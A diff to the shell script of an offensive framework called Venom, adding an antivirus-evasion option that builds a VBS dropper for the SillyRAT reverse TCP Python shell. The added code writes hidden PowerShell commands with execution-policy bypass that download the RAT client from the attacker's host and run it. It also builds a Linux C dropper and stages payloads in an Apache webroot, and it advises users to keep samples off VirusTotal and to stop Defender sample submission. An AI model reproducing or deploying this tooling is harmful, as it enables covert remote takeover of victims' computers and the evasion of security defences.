@@ -10215,6 +10215,20 @@ fi
 sh_shellcode27 () {
 Colors;
 
+
+if [ "$vbsevasion" = "ON" ]; then
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 2
+fi
+
+
 # ----------------- Dependencies Checks -----------------
 
 
@@ -10273,7 +10287,11 @@ if [ "$SOSP" = "Windows" ]; then
    targetos="$SOSP"
    uploadpath="$rpath => (remote)"
    lolbin="Powershell (DownloadFile)"
-   dropperpath="$IPATH/output/$Drop.exe"
+   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
+      dropperpath="$IPATH/output/$Drop.vbs"
+   else
+      dropperpath="$IPATH/output/$Drop.exe"
+   fi
 elif [ "$SOSP" = "Linux" ]; then
    targetos="$SOSP"
    uploadpath="/tmp => (remote)"
@@ -10287,6 +10305,7 @@ else # Mac or multi-platforms
 fi
 
 ## Display final settings to user.
+if [ "$vbsevasion" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 2;fi
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
@@ -10305,22 +10324,22 @@ if [ "$SOSP" = "Windows" ]; then
 
    ## BUILD DROPPER (Install python3/Download/Execute Client.py)
    # Remark: Its mandatory the install of python3/pip3 SillyRAT rat
-   # requirements in target system before executing the Client.py remotely.
+   # requirements in target system before executing the Client.py remote.
    easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
-   if [ "$easter_egg" = "ON" ]; then
+   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
       ## Build dropper.vbs (OBFUSCATION=ON)
       echo "${BlueF}[☠]${white} Creating dropper VBS Program."${Reset};sleep 2
       echo "' Author: r00t-3xp10it [SSA RedTeam @2020]" > $Drop.vbs
-      echo "' Framework: Venom v1.0.17 - Multi-OS - Agent nº 5" >> $Drop.vbs
-      echo "' Function: Install python3 SillyRAT requirements before downloading and" >> $Drop.vbs
-      echo "' executing $Drop.py (Client reverse tcp python shell) in background." >> $Drop.vbs
+      echo "' Framework: Venom v1.0.17 - Multi-OS - Agent nº5" >> $Drop.vbs
+      echo "' Function: Install python3 SillyRAT requirements before downloading" >> $Drop.vbs
+      echo "' and executing $Drop.py (Client reverse tcp python shell) in background." >> $Drop.vbs
       echo "' ---" >> $Drop.vbs
       echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $Drop.vbs
       echo "objShell.Run \"cmd /c powershell \$C=pip show tabulate;If(-not(\$C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}\", 0, True" >> $Drop.vbs
       echo "objShell.Run \"cmd /c powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py\", 0, True" >> $Drop.vbs
       echo "${BlueF}[☠]${white} $Drop.vbs written to output."${Reset};sleep 2
    else
-      ## Build dropper.exe (default)
+      ## Build dropper.exe (default - flagged by AV)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
       cp $IPATH/templates/sillyme.c $IPATH/output/dropper.c
       sed -i "s|LhOsT|$lhost|g" dropper.c
@@ -10379,8 +10398,8 @@ elif [ "$SOSP" = "Linux" ]; then
       echo "         sleep(1);system(\"c=\$(hostnamectl);echo \\\"\$c\\\"\");" >> $Drop.c
       echo "         printf(\"----------------------------------------------------\\\n\");" >> $Drop.c
       echo "" >> $Drop.c
-      echo "            /* Install python3 and SillyRAT requirements */" >> $Drop.c
-      echo "            sleep(1);system(\"sudo apt-get update;C=\$(pip3 show tabulate);if [ \"\$?\" -ne \"0\" ]; then apt-get install -y python3 && pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller;fi\");" >> $Drop.c
+      echo "            /* Install python3 and SillyRAT requirements if not found */" >> $Drop.c
+      echo "            sleep(1);system(\"sudo apt-get update;apt-get install -y python3;pip3 install tabulate pynput psutil pillow pyscreenshot pyinstaller\");" >> $Drop.c
       echo "            printf(\"Done.. ALL $Drop requirements are satisfied.\\\n\");" >> $Drop.c
       echo "" >> $Drop.c
       echo "      }" >> $Drop.c
@@ -10422,7 +10441,7 @@ cd $IPATH/output
 echo "${BlueF}[☠]${white} Porting required files to apache2 webroot."${Reset};sleep 2
 if [ "$SOSP" = "Windows" ]; then
 
-   if [ "$easter_egg" = "ON" ]; then
+   if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
       zip $Drop.zip $Drop.vbs > /dev/nul 2>&1 # ZIP dropper.vbs
       cp $IPATH/output/$Drop.py $ApAcHe/$Drop.py > /dev/nul 2>&1 # rev tcp Client shell
       mv $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1 # Dropper ziped
@@ -12271,6 +12290,15 @@ cat << !
     AGENT EXTENSION    : EXE
     AGENT PERSISTENCE  : NOT AVAILABLE
 
+    AGENT Nº6
+    ─────────
+    DESCRIPTION        : Reverse TCP python Shell (SillyRAT)
+    TARGET SYSTEMS     : Multi-Platform (Linux|Mac|Windows)
+    LOLBin             : Powershell|Wget (DownloadFile)
+    DROPPER EXTENSION  : VBS|NULL
+    AGENT EXTENSION    : PY
+    DETECTION RATIO    : https://....
+
     ╔═════════════════════════════════════════════════════════════╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
@@ -12288,6 +12316,7 @@ case $choice in
 3) sh_evasion3 ;;
 4) sh_evasion4 ;;
 5) sh_evasion5 ;;
+6) vbsevasion="ON";sh_shellcode27 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 *) echo ${RedF}[x]${white} "$choice": is not a valid Option${Reset}; sleep 2; clear; sh_ninja ;;
